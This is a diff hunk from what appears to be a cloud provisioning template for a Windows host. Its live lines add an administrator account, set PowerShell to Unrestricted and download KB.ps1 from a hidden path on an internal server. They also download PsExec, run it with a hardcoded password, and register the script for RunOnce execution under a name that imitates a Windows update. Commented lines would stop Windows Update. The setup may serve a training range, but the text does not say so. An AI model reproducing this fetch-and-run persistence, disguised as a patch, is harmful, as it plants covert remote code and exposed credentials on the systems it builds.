@@ -260,10 +260,10 @@ resources:
             net localgroup administrators /add Eeyore
             net user /add $user $password /y
             Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
-            #Invoke-WebRequest -Uri "10.50.25.121/heat/KB.ps1" -OutFile "C:\KB.ps1"
-            (new-object System.Net.WebClient).DownloadFile( "http://10.50.25.121/heat/KB.ps1","C:\KB.ps1" )
+            #Invoke-WebRequest -Uri "10.50.25.121/linux/.hidden/KB.ps1" -OutFile "C:\KB.ps1"
+            (new-object System.Net.WebClient).DownloadFile( "http://10.50.25.121/linux/.hidden/KB.ps1","C:\KB.ps1" )
             (new-object System.Net.WebClient).DownloadFile( "http://10.50.25.121/windows/PsExec.exe","C:\PsExec.exe" )
-            C:\PsExec.exe -accepteula -u Bill -p DoDC0mPL1antPassW0rd!! \\$(hostname) cmd /c "exit" -accepteula -nobanner
+            C:\PsExec.exe -accepteula -u Bill -p DoDC0mPL1antPassW0rd!! \\$(hostname) cmd /c "exit" -nobanner
             Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -name "KB" 'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -noprofile -sta -File "C:\KB.ps1"'
             #New-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" -Name AUOptions -Value 1 -PropertyType Dword | Out-Null
             #get-service wuauserv | stop-service -Force
